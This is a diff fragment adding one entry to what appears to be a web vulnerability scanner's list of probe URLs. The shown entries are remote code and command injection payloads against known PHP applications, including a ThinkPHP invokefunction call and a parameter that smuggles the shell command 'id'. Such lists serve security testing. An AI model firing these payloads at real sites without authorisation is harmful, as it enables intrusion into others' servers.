@@ -30,3 +30,4 @@
 /index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1
 /modules/bamegamenu/ajax_phpcode.php?code=print(md5({{num}}))
 ?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27
